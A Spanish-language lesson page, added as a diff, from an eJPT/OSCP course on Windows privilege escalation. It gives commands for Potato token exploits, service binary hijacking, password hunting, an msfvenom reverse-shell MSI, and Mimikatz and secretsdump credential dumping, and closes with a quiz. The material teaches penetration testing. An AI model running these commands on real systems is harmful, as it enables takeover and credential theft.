@@ -1,0 +1,93 @@
+12 · Escalada de privilegios en Windows|winPEAS, privilegios de token, servicios inseguros, credenciales guardadas, UAC y Mimikatz.
+<span class="badge ejpt">Nivel 1 · eJPTv2</span><span class="badge oscp">Crítico en OSCP</span>
+<h1>12 · Escalada de privilegios en Windows</h1>
+<p class="lead">Objetivo: pasar de un usuario normal a <b>Administrator</b> o <b>NT AUTHORITY\SYSTEM</b>. La lógica es la misma que en Linux: enumerar y encontrar la mala configuración.</p>
+
+<h2>1. Enumeración inicial</h2>
+<pre><span class="p">&gt;</span> whoami /priv            <span class="c"># ⭐ privilegios (busca SeImpersonate, SeBackup...)</span>
+<span class="p">&gt;</span> whoami /groups
+<span class="p">&gt;</span> systeminfo              <span class="c"># versión, parches (hotfix) → exploits</span>
+<span class="p">&gt;</span> net user; net localgroup administrators
+<span class="p">&gt;</span> ipconfig /all           <span class="c"># ¿más redes? (pivoting)</span></pre>
+
+<h2>2. Enumeración automática</h2>
+<pre><span class="c"># Sube winPEAS.exe y ejecútalo</span>
+<span class="p">&gt;</span> winPEASx64.exe
+<span class="c"># Alternativas: PowerUp.ps1, Seatbelt.exe, WinPEAS versión .bat</span>
+<span class="p">PS&gt;</span> Import-Module .\PowerUp.ps1; Invoke-AllChecks</pre>
+
+<h2>3. Vectores principales</h2>
+<figure>
+<svg viewBox="0 0 820 220" role="img" aria-label="Vectores privesc Windows">
+<g text-anchor="middle" font-size="13">
+<rect x="20" y="20" width="240" height="80" rx="10" fill="#dc262622" stroke="#dc2626"/><text x="140" y="48" font-weight="800">Token Privileges</text><text x="140" y="72" font-size="12" class="muted">SeImpersonate → PotatoES</text>
+<rect x="290" y="20" width="240" height="80" rx="10" fill="#d9770622" stroke="#d97706"/><text x="410" y="48" font-weight="800">Servicios</text><text x="410" y="72" font-size="12" class="muted">unquoted path, permisos</text>
+<rect x="560" y="20" width="240" height="80" rx="10" fill="#0f9d6e22" stroke="#0f9d6e"/><text x="680" y="48" font-weight="800">Credenciales</text><text x="680" y="72" font-size="12" class="muted">guardadas, registro, ficheros</text>
+<rect x="20" y="120" width="240" height="80" rx="10" fill="#2563eb22" stroke="#2563eb"/><text x="140" y="148" font-weight="800">AlwaysInstall-</text><text x="140" y="166" font-weight="800">Elevated</text>
+<rect x="290" y="120" width="240" height="80" rx="10" fill="#a855f722" stroke="#a855f7"/><text x="410" y="148" font-weight="800">Tareas / Autoruns</text><text x="410" y="172" font-size="12" class="muted">binarios reemplazables</text>
+<rect x="560" y="120" width="240" height="80" rx="10" fill="#dc262622" stroke="#dc2626"/><text x="680" y="148" font-weight="800">Exploits</text><text x="680" y="172" font-size="12" class="muted">kernel por hotfix faltante</text>
+</g></svg></figure>
+
+<h3>a) Privilegios de token (lo más rápido)</h3>
+<div class="box warn"><strong>⚠️ SeImpersonatePrivilege</strong>Si <code>whoami /priv</code> muestra <b>SeImpersonatePrivilege</b> activado (típico de cuentas de servicio y www de IIS), usa un exploit “Potato” para saltar a SYSTEM:</div>
+<pre><span class="p">&gt;</span> PrintSpoofer.exe -i -c cmd       <span class="c"># o GodPotato, JuicyPotato, RoguePotato</span>
+<span class="p">&gt;</span> GodPotato.exe -cmd "cmd /c whoami"   <span class="c"># → nt authority\system</span></pre>
+
+<h3>b) Servicios inseguros</h3>
+<pre><span class="c"># Unquoted Service Path: ruta con espacios y sin comillas</span>
+<span class="p">&gt;</span> wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+<span class="c"># Si es C:\Program Files\Mi App\srv.exe sin comillas y puedes escribir en Program Files:</span>
+<span class="c"># colocas C:\Program.exe malicioso</span>
+<span class="c"># Permisos débiles del servicio (puedes cambiar su binario):</span>
+<span class="p">&gt;</span> sc config servicio binPath= "C:\temp\shell.exe"
+<span class="p">&gt;</span> sc stop servicio &amp; sc start servicio</pre>
+
+<h3>c) Credenciales guardadas</h3>
+<pre><span class="p">&gt;</span> reg query HKLM /f password /t REG_SZ /s
+<span class="p">&gt;</span> cmdkey /list                          <span class="c"># credenciales guardadas</span>
+<span class="p">&gt;</span> dir /s *unattend.xml *sysprep* web.config
+<span class="p">&gt;</span> findstr /si password *.txt *.ini *.config *.xml</pre>
+
+<h3>d) AlwaysInstallElevated</h3>
+<pre><span class="p">&gt;</span> reg query HKLM\...\Installer /v AlwaysInstallElevated
+<span class="p">&gt;</span> reg query HKCU\...\Installer /v AlwaysInstallElevated
+<span class="c"># Si ambos = 1: generas un .msi con msfvenom y lo instalas → SYSTEM</span>
+<span class="p">$</span> msfvenom -p windows/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f msi -o x.msi
+<span class="p">&gt;</span> msiexec /quiet /qn /i x.msi</pre>
+
+<h2>4. Volcar credenciales: Mimikatz</h2>
+<pre><span class="c"># Con privilegios de admin/SYSTEM</span>
+mimikatz# privilege::debug
+mimikatz# sekurlsa::logonpasswords     <span class="c"># contraseñas/hashes en memoria</span>
+mimikatz# lsadump::sam                  <span class="c"># hashes locales (SAM)</span>
+<span class="c"># Desde Kali con credenciales:</span>
+<span class="p">$</span> secretsdump.py dominio/user:pass@10.0.2.5</pre>
+
+<h2>5. Exploits del sistema (último recurso)</h2>
+<pre><span class="p">&gt;</span> systeminfo             <span class="c"># mira "Hotfix(s)" instalados</span>
+<span class="c"># Herramienta que sugiere exploits según los parches que FALTAN:</span>
+<span class="p">$</span> windows-exploit-suggester / wesng con la salida de systeminfo</pre>
+
+<div class="box oscp"><strong>🔴 Nivel OSCP: orden recomendado</strong>1) whoami /priv (¿SeImpersonate? → Potato). 2) winPEAS. 3) Servicios (unquoted/permisos). 4) Credenciales (registro, ficheros, cmdkey). 5) AlwaysInstallElevated. 6) Scheduled tasks/autoruns. 7) Exploits por hotfix faltante. Documenta todo.</div>
+
+<h2>🎥 Vídeos</h2>
+<div class="vlinks">
+<a href="https://www.youtube.com/results?search_query=escalada+privilegios+windows+espa%C3%B1ol" target="_blank" rel="noopener">Privesc Windows (ES)</a>
+<a href="https://www.youtube.com/results?search_query=winpeas+privilege+escalation+windows" target="_blank" rel="noopener">winPEAS</a>
+<a href="https://www.youtube.com/results?search_query=mimikatz+tutorial" target="_blank" rel="noopener">Mimikatz</a>
+</div>
+
+<h2>📝 Evaluación del tema</h2>
+<script type="application/json" data-quiz="Cuestionario 12 · Privesc Windows">
+[
+{"q":"¿Qué privilegio de token lleva a SYSTEM con exploits 'Potato'?","o":["SeShutdown","SeImpersonatePrivilege","SeTime","SeUndock"],"a":1,"e":"SeImpersonatePrivilege → PrintSpoofer/GodPotato."},
+{"q":"¿Qué herramienta automática enumera privesc en Windows?","o":["linpeas","winPEAS","hydra","nmap"],"a":1,"e":"winPEAS (o PowerUp.ps1)."},
+{"q":"Un 'unquoted service path' se explota porque…","o":["El servicio no arranca","Windows prueba rutas con espacios y puedes colocar un .exe antes","Es un virus","Cifra el disco"],"a":1,"e":"Sin comillas y con espacios, Windows ejecuta C:\\Program.exe si existe."},
+{"q":"¿Qué comando lista credenciales guardadas en Windows?","o":["cmdkey /list","sudo -l","getcap","net share"],"a":0,"e":"cmdkey /list."},
+{"q":"Si AlwaysInstallElevated está a 1 en HKLM y HKCU puedes…","o":["Nada","Instalar un .msi malicioso como SYSTEM","Ver contraseñas","Apagar"],"a":1,"e":"Cualquier .msi se instala con privilegios de SYSTEM."},
+{"q":"Mimikatz con sekurlsa::logonpasswords obtiene…","o":["Puertos abiertos","Contraseñas/hashes de la memoria (LSASS)","El kernel","Subdominios"],"a":1,"e":"Lee credenciales de LSASS."},
+{"q":"¿Qué cuenta es el objetivo final en un Windows?","o":["Guest","NT AUTHORITY\\SYSTEM","User","Anonymous"],"a":1,"e":"SYSTEM = control total."},
+{"q":"Para sugerir exploits por parches faltantes usas la salida de…","o":["ipconfig","systeminfo","whoami","dir"],"a":1,"e":"systeminfo + windows-exploit-suggester/wesng."}
+]
+</script>
+<div class="lab"><h4>🧪 Práctica</h4><p>Resuelve en TryHackMe las salas <b>"Windows PrivEsc"</b> y <b>"Windows PrivEsc Arena"</b>. Practica al menos: SeImpersonate→Potato, servicio con permisos débiles y AlwaysInstallElevated.</p></div>
